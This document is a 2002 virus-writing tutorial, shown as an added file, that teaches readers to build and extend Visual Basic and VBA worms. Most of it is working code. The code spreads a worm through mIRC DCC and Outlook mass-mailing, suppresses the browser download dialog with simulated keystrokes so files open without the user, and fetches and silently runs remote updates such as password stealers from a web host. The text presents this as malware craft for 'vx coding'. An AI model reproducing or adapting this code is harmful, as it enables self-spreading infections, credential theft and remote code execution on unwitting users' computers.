@@ -1,0 +1,239 @@
+-----------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------
+					Updating your VB / VBA worms via the Internet
+-----------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------
+
+
+You wished to make a VB worm in VB6, typed,
+
+--------------------------------
+Option Explicit
+Sub Main()
+On Error Resume Next
+Dim a, b, c, y, x, oo, d, e, xx, yy, zz
+xx = App.Path & App.EXEName & ".exe"
+yy = App.Path & "\" & App.EXEName & ".exe"
+zz = "c:\worm.exe"
+FileCopy xx, zz
+FileCopy yy, zz
+End Sub
+--------------------------------
+
+And pondered, "How can i make it more functional in the Internet?"
+
+Well reader, since your VB worm will operate in an environment called the cyberspace, there are many possibilities
+that you can explore, thus adding some functionality to your vb worm.. you can add a code that will enable it to
+transmit itself to the irc...
+
+-------------------------
+Sub IRC()
+Open "c:\mIRC\script.ini" for output as 3
+Print #3, "n1= on 1:JOIN:#:{"
+Print #3, "n2= /if ( $nick == $me ) { halt }"
+Print #3, "n3= /msg $nick Hello.. this is a worm.."
+Print #3, "n4= /dcc send -c $nick c:\worm.exe"
+Print #3, "n5= }"
+Close 1
+-------------------------
+
+or add a code that will transmit itself to e-mails
+
+---------------------------
+Sub Outlook()
+Set a = CreateObject("Outlook.Application")
+Set b = a.GetNameSpace("MAPI")
+If a = "Outlook" Then
+b.Logon "profile", "password"
+For y = 1 To b.AddressLists.Count
+Set d = b.AddressLists(y)
+x = 1
+Set c = a.CreateItem(0)
+For oo = 1 To d.AddressEntries.Count
+e = d.AddressEntries(x)
+c.Recipients.Add e
+x = x + 1
+If x > 88 Then oo = d.AddressEntries.Count
+Next oo
+c.Subject = "(Your Personalized Subject)"
+c.Body = "(Your Personalized Body)"
+c.Attachments.Add "c:\worm.exe"
+c.Send
+e = ""
+Next y
+b.Logoff
+End If
+End Sub
+--------------------------
+
+And you may ask, "Alco, you shitty brat! that's common for vbworms in the wild nowadays! and i know that crap
+already!! what can i do to make it more different, asshole!"
+
+Ok, ok.. calm down...
+
+So if you want some difference, try this..
+
+Taaadaaaa!!! ---updating your vb worms via the internet---
+
+"that's new.. but the concept is not.. W32/Hybris and WM97/One did that already.. but in vb worms, hmmnn"
+
+Yes, reader... It's possible... Imagine your vb worm downloading some extra routines/updates or a password stealer 
+or a picture that your vb worm wishes to post as a wallpaper in its infected host or other stuffs without 
+user interaction.. YES, without user interaction. User interaction is our #1 enemy ei :P.. 
+So what are you waiting for?? Read..
+
+-------------
+THE CODE
+-------------
+
+(!!!)First, you must have a site to upload the updates
+
+When you click a link with a file on it, this pops out...
+
+----------------------------------------------------------------
+File Download
+----------------------------------------------------------------
+ (?) You are downloading the file :
+     File.ext from www.yoursite.com
+
+    Would you like to open the file or save it to your computer?
+
+    Open       Save       Cancel        More Info
+
+----------------------------------------------------------------
+
+This dialog box is so important, reader... without this, we can't get programs, mp3s and other relevant files from
+the internet. It serves as a getway for some files to get to our harddrives. as a creative VB worm writer, we must find 
+ways to exploit this dialog box... and luckily we found some.. now let's code..
+
+Sub update()
+on error resume next
+Shell "start http://www.yoursite.com/blah/bleh/blih/File.ext", vbHide
+End sub
+
+This code makes the dialog box above to appear... vbHide is added so IE won't pop out...
+Next...
+
+Sub update()
+on error resume next
+Shell "start http://www.yoursite.com/blah/bleh/blih/File.ext", vbHide
+Open "c:\v.vbs" For Output As 2
+Print #2, "Dim sh"
+Print #2, "Set sh = CreateObject(""WScript.Shell"")"
+Print #2, " Do Until sh.AppActivate(""File Download"")"
+Print #2, "Loop"
+Print #2, "sh.sendkeys ""%O"""
+Close 2
+Shell "start c:\v.vbs", vbHide <----- execute v.vbs in a stealthy way..
+End sub
+
+
+The added code is the important one... it makes the dialog box disappear and open File.ext without user interaction...
+hehehhe
+
+let's examine..
+
+c:\type v.vbs
+Dim sh  
+Set sh = CreateObject("Wscript.Shell") <---------- any OBJECTions? :))
+Do Until sh.AppActivate("File Download") <----------  We must do all the things possible to activate the dialog box
+Loop <----------------- "Hey dialog, be active..hehehhe!"
+sh.sendkeys "%o" <------------ when the dialog is active, send alt+o to automatically open File.ext
+
+
+So that's it... Simple... simple things make some big difference...
+
+(!) the compiled one will produce our desired result....
+
+That downloaded file as i've said, can be an update
+to your worm or some extra routines or a password stealer or a picture file or even a text you wish to tell the 
+infected user...
+
+------------------
+for your vba worm
+------------------
+
+jackie has published a tutorial regarding updating your macro virus via www..
+his technique uses internetexplorer.application object...
+
+jackie's technique (published without prior notice)
+
+----------------------------
+sub jackieupdate()
+Set objNET = CreateObject("InternetExplorer.Application")
+Do While objNET.Busy
+VBA.DoEvents
+Loop
+objNET.Visible = 0
+objNET.Navigate "http://www.your-url-here.org/your-file-here.txt"
+Do While objNET.ReadyState <> 4
+VBA.DoEvents
+Loop
+sCode = objNET.Document.Body.innerText
+objNET.Quit
+end sub
+----------------------------
+
+i've tested this code myself and it surely works fine.. drawback : you'll have to wait for some time to
+get the desired code....
+
+
+another technique will be laid, muchachos y muchachas...
+
+let's code...
+
+-------------------------
+-------------------------
+sub update()
+Dim objInet
+Dim intfile As Integer
+Dim strDownloadedCode As String
+Set objInet = CreateObject("InetCtls.Inet") ' another useful object, baby!
+objInet.RequestTimeOut = 25 'wait for 25 secs..
+strDownloadedCode = objInet.OpenURL("http://members.tripod.com/alc0paul/update.txt") ' get the update
+end sub
+-------------------------
+
+strDownloadedCode contains update.txt contents which can be routine that you wish to add to your vba 
+worm.. as you can see, it's much shorter that jackie's and there are no loops which consume
+computer time...
+
+muchachos y muchachas doin some vx coding, the technique laid above can be also used to download a binary
+update for your vb worms....watch out for this...
+
+--------------------------------------
+binary update for your vb worm/virus
+--------------------------------------
+
+written : july 13, 2002
+
+so you want the code for the binary update? here it is...
+
+Sub downloader()
+On Error Resume Next
+Dim databyte() As Byte
+If InternetGetConnectedState(0&, 0&) = 0 Then GoTo xIt
+Set objInet = CreateObject("InetCtls.Inet")
+objInet.RequestTimeout = 40
+databyte() = objInet.OpenURL("http://yoursite.com/file.plg", icByteArray)
+Open "c:\update.exe" For Binary Access Write As #2
+Put #2, , databyte()
+Close #2
+Shell "c:\update.exe", vbHide
+xIt:
+End Sub
+
+the routing checks for internet connection.. if present, download the update, save as update.exe and run update.exe...
+
+the benefit of InetCtls.Inet.. don't rely on internetexplorer....
+
+that's all..
+
+alcopaul
+1/30/2k2
+rehashed 3/2/2k2
+rerehashed july/13/2002
